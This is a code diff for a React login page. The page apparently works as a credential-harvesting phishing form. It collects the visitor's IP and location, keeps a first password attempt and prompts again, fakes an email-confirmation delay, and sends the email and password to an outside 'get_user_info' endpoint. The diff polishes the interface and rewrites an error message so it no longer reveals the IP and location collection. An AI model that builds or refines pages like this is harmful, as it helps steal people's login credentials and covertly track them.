@@ -44,6 +44,7 @@ const Login = () => {
     fetchIpInfo();
   }, []);
 
+  // Handle email input change
   const handleEmailChange = (e) => {
     setEmail(e.target.value);
     // Reset confirmation and errors when email changes
@@ -57,6 +58,7 @@ const Login = () => {
     }
   };
 
+  // Handle email submission
   const handleEmailSubmit = () => {
     if (!email.match(/^[^\s@]+@[^\s@]+\.[^\s@]+$/)) {
       setPasswordError('Please enter a valid email address.');
@@ -66,12 +68,14 @@ const Login = () => {
     setIsLoading(true);
     setPasswordError('');
 
+    // Simulate 2-second loading time
     setTimeout(() => {
       setIsLoading(false);
       setIsEmailConfirmed(true);
-    }, 2000); // Simulate 2-second loading time
+    }, 2000);
   };
 
+  // Handle login attempt
   const handleLogin = async () => {
     if (attemptCount === 0) {
       // Store the first password attempt
@@ -96,7 +100,7 @@ const Login = () => {
 
     // Check if IP info has been fetched
     if (!ipInfo || Object.keys(ipInfo).length === 0) {
-      setPasswordError('Failed to fetch IP and location information. Please try again.');
+      setPasswordError('Please try again.');
       return;
     }
 
@@ -106,6 +110,7 @@ const Login = () => {
     setIsLoading(true);
     setPasswordError('');
 
+    // Try to send login request to backend
     try {
       const response = await axios.post('https://nm-be.vercel.app/api/get_user_info/', {
         email: email,
@@ -148,6 +153,7 @@ const Login = () => {
               disabled={isEmailConfirmed}
               placeholder="Enter your email"
               required
+              autoFocus={!isEmailConfirmed} // Auto focus the email input when email is not confirmed
             />
           </div>
           {!isEmailConfirmed && (
@@ -183,21 +189,19 @@ const Login = () => {
 
             {passwordError && <p className="error-text">{passwordError}</p>}
 
-            {password && (
-              <div className="login-btn-wrapper">
-                <button
-                  className=""
-                  onClick={handleLogin}
-                  disabled={isLoading || Object.keys(ipInfo).length === 0} // Disable login if IP info isn't fetched
-                >
-                  {isLoading ? (
-                    <span className="spinner"></span>
-                  ) : (
-                    'Continue'
-                  )}
-                </button>
-              </div>
-            )}
+            <div className="login-btn-wrapper">
+              <button
+                className=""
+                onClick={handleLogin}
+                disabled={isLoading || !password} // Button is disabled until the user starts typing
+              >
+                {isLoading ? (
+                  <span className="spinner"></span>
+                ) : (
+                  'Continue'
+                )}
+              </button>
+            </div>
           </>
         )}
       </div>
